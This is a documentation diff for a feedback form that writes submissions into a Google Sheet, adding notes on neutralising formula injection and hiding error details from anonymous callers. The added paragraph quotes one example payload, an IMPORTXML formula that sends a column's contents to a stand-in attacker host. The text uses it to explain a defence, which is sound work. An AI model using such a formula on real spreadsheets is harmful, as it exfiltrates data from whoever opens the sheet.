@@ -142,6 +142,15 @@ does nothing to slow one determined person down.
    cannot spend the day's mail quota. The rows are the record; the email is only the nudge.
 4. **Cloudflare Turnstile**, wired but off.
 
+**Everything a stranger writes is defused before it reaches a cell.** `appendRow` stores a string
+as if it had been typed, so a message beginning `=`, `+`, `-` or `@` would be kept as a *live
+formula* and evaluated in your browser, with your authority, the moment you opened the sheet —
+`=IMPORTXML("https://evil.example/?x="&TEXTJOIN(",",1,A:A),"//a")` sends the sheet's contents to
+whoever asked. `safe_()` in the script puts a leading apostrophe on anything that starts like a
+formula (invisible in the cell, so "-5 stars, sorry" still reads correctly), strips control
+characters, and caps every field's length server-side — the client truncates too, but the client is
+a suggestion when the endpoint is world-writable.
+
 A refused submission is answered as if it succeeded, and its message is kept in the `Blocked` tab
 with the reason. Both halves are deliberate: a bot told which check it failed tries the next thing,
 and a false positive is somebody's bug report, which should be recoverable rather than merely
@@ -203,5 +212,8 @@ deployment, no new Sheet. Inside this repository a new era is carried along for 
   eventually is worse than an honest failure now.
 - **No endpoint is configured** — there is no button. That is the difference between "broken" and
   "switched off".
+- **Something throws** — the visitor is told it did not send, and the reply says only that. An
+  exception string names tabs, ranges and quota states, and the caller here is anonymous; the real
+  error goes to the Apps Script execution log, where it is not also handed to whoever caused it.
 - **A row cannot be written** — the visitor is still thanked. There is nothing they could do
   differently, and the alternative is a stranger who tried to help being shown an error.
